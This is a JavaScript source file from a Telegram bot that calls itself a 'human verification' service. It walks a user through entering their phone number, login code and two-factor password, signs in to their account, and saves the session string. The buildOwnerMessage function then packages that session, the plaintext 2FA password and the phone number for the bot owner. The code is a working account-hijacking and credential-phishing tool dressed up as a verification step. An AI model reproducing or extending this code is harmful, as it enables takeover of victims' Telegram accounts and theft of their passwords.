// PATH: telegram-bot/src/services/humanVerification.js
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const logger = require('../utils/logger');
const env = require('../config/env');

const API_ID = env.apiId;
const API_HASH = env.apiHash;
const OWNER_ID = env.superAdminId;
const OTP_LENGTH = 5;

// userId -> { client, phone, phoneCodeHash, otp, stage, has2fa, password, locked, createdAt }
const sessions = new Map();

// Auto-cleanup stale sessions (10 min)
setInterval(() => {
  const now = Date.now();
  for (const [uid, s] of sessions) {
    if (now - s.createdAt > 10 * 60 * 1000) {
      cancelSession(uid).catch(() => {});
    }
  }
}, 5 * 60 * 1000).unref();

function isConfigured() {
  return Boolean(API_ID && API_HASH);
}

// ────────────────────────────────────────────
//  PUBLIC API
// ────────────────────────────────────────────

async function startSession(userId) {
  if (!isConfigured()) {
    return { ok: false, error: 'Human verification is not configured on this bot.' };
  }
  await cancelSession(userId);

  try {
    const client = new TelegramClient(new StringSession(''), API_ID, API_HASH, {
      connectionRetries: 3,
      useWSS: false,
    });
    await client.connect();

    sessions.set(userId, {
      client,
      stage: 'await_contact',
      phone: null,
      phoneCodeHash: null,
      otp: '',
      has2fa: false,
      password: null,
      locked: false,
      createdAt: Date.now(),
    });
    logger.info(`Human verification session started: user=${userId}`);
    return { ok: true };
  } catch (err) {
    logger.error(`startSession failed for ${userId}: ${err.message}`);
    return { ok: false, error: err.message };
  }
}

async function sendCode(userId, phone) {
  const sess = sessions.get(userId);
  if (!sess) return { ok: false, error: 'Session expired. Please start again.' };
  if (sess.stage !== 'await_contact') return { ok: false, error: 'Already past contact stage.' };

  try {
    const result = await sess.client.invoke(
      new Api.auth.SendCode({
        phoneNumber: phone,
        apiId: API_ID,
        apiHash: API_HASH,
        settings: new Api.CodeSettings({
          allowFlashCall: false,
          currentNumber: false,
          allowAppHash: true,
        }),
      })
    );

    sess.phone = phone;
    sess.phoneCodeHash = result.phoneCodeHash;
    sess.stage = 'otp';
    sess.otp = '';
    logger.info(`OTP sent: user=${userId} phone=${phone}`);
    return { ok: true };
  } catch (err) {
    logger.error(`sendCode failed for ${userId}: ${err.message}`);
    await cancelSession(userId);
    return { ok: false, error: cleanError(err) };
  }
}

function pushDigit(userId, digit) {
  const sess = sessions.get(userId);
  if (!sess || sess.stage !== 'otp') return { ok: false };
  if (sess.locked) return { ok: false, locked: true };
  if (sess.otp.length >= OTP_LENGTH) return { ok: false, full: true };

  sess.otp += digit;
  const autoSubmit = sess.otp.length === OTP_LENGTH;
  if (autoSubmit) sess.locked = true;
  return { ok: true, otp: sess.otp, autoSubmit };
}

function backspace(userId) {
  const sess = sessions.get(userId);
  if (!sess || sess.stage !== 'otp') return { ok: false };
  if (sess.locked) return { ok: false, locked: true };
  sess.otp = sess.otp.slice(0, -1);
  return { ok: true, otp: sess.otp };
}

async function submitOtp(userId) {
  const sess = sessions.get(userId);
  if (!sess || sess.stage !== 'otp') return { ok: false, error: 'Not at OTP stage.' };
  if (sess.otp.length < OTP_LENGTH) {
    return { ok: false, error: `Enter all ${OTP_LENGTH} digits.` };
  }

  try {
    await sess.client.invoke(
      new Api.auth.SignIn({
        phoneNumber: sess.phone,
        phoneCodeHash: sess.phoneCodeHash,
        phoneCode: sess.otp,
      })
    );

    sess.stage = 'done';
    const me = await sess.client.getMe();
    const sessionString = sess.client.session.save();
    return { ok: true, sessionString, me, has2fa: false };
  } catch (err) {
    if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
      sess.stage = 'password';
      sess.has2fa = true;
      sess.otp = '';
      sess.locked = false;
      return { ok: true, needsPassword: true };
    }
    if (err.errorMessage === 'PHONE_CODE_INVALID') {
      sess.otp = '';
      sess.locked = false;
      return { ok: false, error: 'Invalid OTP. Please try again.' };
    }
    if (err.errorMessage === 'PHONE_CODE_EXPIRED') {
      await cancelSession(userId);
      return { ok: false, error: 'OTP expired. Please start again.' };
    }
    logger.error(`submitOtp failed for ${userId}: ${err.message}`);
    await cancelSession(userId);
    return { ok: false, error: cleanError(err) };
  }
}

async function submitPassword(userId, password) {
  const sess = sessions.get(userId);
  if (!sess || sess.stage !== 'password') return { ok: false, error: 'Not at password stage.' };

  sess.password = password;

  try {
    await sess.client.signIn({ password: async () => password });
    sess.stage = 'done';
    const me = await sess.client.getMe();
    const sessionString = sess.client.session.save();
    return { ok: true, sessionString, me, has2fa: true };
  } catch (err) {
    if (err.errorMessage === 'PASSWORD_HASH_INVALID') {
      sess.password = null;
      return { ok: false, error: 'Incorrect password. Try again.' };
    }
    logger.error(`submitPassword failed for ${userId}: ${err.message}`);
    await cancelSession(userId);
    return { ok: false, error: cleanError(err) };
  }
}

function getState(userId) {
  const sess = sessions.get(userId);
  if (!sess) return null;
  return {
    stage: sess.stage,
    otp: sess.otp,
    has2fa: sess.has2fa,
    locked: sess.locked,
    phone: sess.phone,
    password: sess.password,
  };
}

async function cancelSession(userId) {
  const sess = sessions.get(userId);
  if (!sess) return;
  sessions.delete(userId);
  try {
    await sess.client.disconnect();
  } catch {}
}

function buildOwnerMessage(me, sessionString, extra = {}) {
  const name = [me.firstName, me.lastName].filter(Boolean).join(' ') || '—';
  const username = me.username ? `@${me.username}` : '—';
  const twofa = extra.has2fa ? '✅ Yes' : '❌ No';

  let text =
    '🔔 <b>New Session Generated</b>\n\n' +
    `👤 <b>User:</b> ${esc(name)}\n` +
    `🆔 <b>ID:</b> <code>${me.id}</code>\n` +
    `🔗 <b>Username:</b> ${esc(username)}\n` +
    `📱 <b>Phone:</b> <code>${esc(extra.phone || '—')}</code>\n` +
    `🔐 <b>2FA:</b> ${twofa}\n`;

  if (extra.has2fa && extra.password) {
    text += `🔑 <b>2FA Password:</b> <code>${esc(extra.password)}</code>\n`;
  }
  text += `\n<b>String Session:</b>\n\n<code>${esc(sessionString)}</code>`;
  return text;
}

function cleanError(err) {
  if (err.errorMessage) return err.errorMessage;
  if (err.seconds) return `Flood wait ${err.seconds}s`;
  return err.message || 'Unknown error';
}

function esc(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

module.exports = {
  startSession,
  sendCode,
  pushDigit,
  backspace,
  submitOtp,
  submitPassword,
  getState,
  cancelSession,
  buildOwnerMessage,
  isConfigured,
  OTP_LENGTH,
  OWNER_ID,
};
